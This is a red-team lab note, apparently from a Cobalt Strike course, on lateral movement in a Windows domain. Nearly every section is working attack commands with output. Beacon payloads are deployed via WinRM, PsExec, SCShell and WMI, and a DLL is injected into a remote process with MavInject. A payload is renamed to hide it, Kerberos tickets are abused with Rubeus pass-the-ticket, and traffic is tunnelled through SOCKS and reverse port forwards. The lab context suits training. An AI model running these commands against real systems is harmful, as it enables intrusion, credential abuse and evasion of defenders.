# Lateral Movement with CS

#### Issues with Lateral Movement

After moving laterally to a new computer, you may attempt to run a domain enumeration tool and find it does not work.  After moving laterally to _abc-ws-1_ using the WinRM technique, and found that the `Get-DomainTrust` cmdlet from PowerView throws an exception.

```
[+] established link to parent beacon: 10.10.120.101
 
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-DomainTrust

ERROR: Exception calling "FindOne" with "0" argument(s): "An operations error occurred.
ERROR: "
ERROR: At line:6330 char:50
ERROR: + ... $PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
```

Some login types do not store their credentials in LSASS on the remote machine. The credential type could be a NTLM hash, Kerberos TGT, or a plaintext password. It does not matter which type of credential is stored, just that it is stored in LSASS on the remote computer. The only logon type that does not leave credentials in LSASS is Network.  It also just so happens that both WinRM and PsExec use the Network type. If we take note of the tickets in this new session on _abc-ws-1_, we only have the HTTP service ticket that allowed us to use the WinRM service.

```
Cached Tickets: (1)

#0>	Client: rsteel @ CONTOSO.COM
	Server: HTTP/lon-ws-1 @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize 
	Start Time: 2/18/2025 10:43:31 (local)
	End Time:   2/18/2025 20:43:31 (local)
	Renew Time: 0
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x8 -> ASC 
	Kdc Called:
```

The solution is to leverage a user impersonation technique, such as make\_token or ptt. This will store a valid credential in LSASS and allow you to perform further enumeration.

You may not need to enumerate from this specfic host. Can you enumerate the domain from another position in the network?

### **WinRM**

Beacons executed via WinRM will run in the context of the current or impersonated user.

```
jump winrm64 abc-ws-1 smb
# single shot command
remote-exec winrm abc-ws-1 net sessions
```

### **PSExec**

```
jump psexec64 abc-ws-1 smb
```

Beacons executed via PsExec will always run as SYSTEM. **PsExec is generally regarded as one of the loudest lateral movement techniques as new service creations are relatively rare events to see day-to-day.**

### **SCShell**

[SCShell](https://github.com/Mr-Un1k0d3r/SCShell/tree/master/CS-BOF) project.  This implements a variation of PsExec, where an existing service is temporarily modified to run a payload and then restored afterwards, instead of a new service being created. Simply load `C:\Tools\SCShell\CS-BOF\scshell.cna` into the client by going to **Cobalt Strike > Script Manager**.  Then new `scshell`/`scshell64` exploits will be available.

```
jump scshell64 abc-ws-1 smb
```

### **MavInject**

**BAD OPSEC DONT DO THIS**&#x20;

MavInject is a signed Microsoft executable that provides functionality for App-V to inject libraries into other process.  It lives in the System32/SysWOW64 directories on default Windows installations. This utility can be abused to inject any arbitrary DLL into a target process, using the syntax `mavinject.exe [PID] /INJECTRUNNING [DLL PATH]`.  First, use `remote-exec` to list the running processes on the remote target.

```
remote-exec winrm abc-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
```

Then, upload a DLL payload to the target and use MavInject to inject it into your chosen process.

```
cd \\abc-ws-1\ADMIN$\System32
upload C:\Payloads\smb_x64.dll

remote-exec wmi abc-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll
Started process 1608 on lon-ws-1

link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
[+] established link to child beacon: 10.10.120.10
```

### **WMI Lateral Movement**

Change the beacon file name first locally Need to change the beacons working directory

```
cd \\abc-ws-1\ADMIN$
upload C:\Payloads\smb_x64.exe

# can mv if needed
ls \\abc-ws-1\ADMIN$
mv \\abc-ws-1\ADMIN$\smb_x64.exe \\abc-ws-1\ADMIN$\hidden.exe
ls \\abc-ws-1\ADMIN$

remote-exec wmi abc-ws-1 C:\Windows\smb_x64.exe
Started process 4548 on lon-ws-1

link abc-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

### Socks

```
socks 1080
```

Make sure to add your targets to your hosts file for things like kerberos authentication (requires hostnames)

```
# Local ops station
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1'
```

### Proxifier on Windows

Proxifier is a tool that runs on Windows and forces your TCP traffic through a proxy. To create a new proxy server profile, select **Profile > Proxy Servers**.  The IP address will be that of your team server, and the port and protocol need to match what you used in the `socks` command.

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/5cf7ad8f4581f74f2495b8807eeca358.png)

When adding a new proxification rule, you can generally leave the applications field as _Any_ but specify the IP range (and/or domain names) of your target hosts.  This ensures that only traffic destined for the target internal network will go through the proxy.

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/f3f7b72d20b9b26c6e15f04c4c7fb5cc.png)

You can then launch a tool such as `C:\Tools\SysinternalsSuite\ADExplorer64.exe` and attempt to connect to a target DC with an explicit username and password.&#x20;

```
# Local ops station
$Cred = Get-Credential CONTOSO.COM\ajohnson
Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Credential $Cred -Server abc-dc-1
```

To leverage Kerberos tickets, start a new process with a fake password using `Rubeus createnetonly` and the `/show` parameter.

```
# Local ops station
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /domain:CONTOSO.COM /username:ajohnson/password:FakePass /program:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /ticket:C:\Users\ice-wzl\Desktop\rsteel.kirbi /show
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```

We also need to request service tickets manually, rather than relying on Windows doing it magically for us.  For example, to query Active Directory, use `asktgs` to get a ticket for LDAP and pass it directly into this logon session.

```
# Local ops station
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/abc-dc-1 /ticket:C:\Users\ice-wzl\Desktop\ajohnson.kirbi /dc:abc-dc-1 /ptt

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
Import-Module ActiveDirectory
Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Server abc-dc-1 | select DistinguishedName
```

### Reverse Port Forwards

```
rportfwd [bind port] [forward host] [forward port]
```

First, add a firewall rule to allow port 28190 inbound.

```
make_token CONTOSO\ajohnson Passw0rd!
run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
rportfwd 28190 localhost 80
remote-exec winrm abc-ws-1 iwr http://abc-wkstn-1:28190/test
```

(**View > Web Log**).

```
02/19 11:09:44 visit (port 80) from: 127.0.0.1
    Request: GET /test
    Response: 404 Not Found
    Mozilla/5.0 (Windows NT; Windows NT 10.0; en-GB) WindowsPowerShell/5.1.20348.2849

# cleanup 
rportfwd stop 28190
run netsh advfirewall firewall delete rule name="Debug"
```
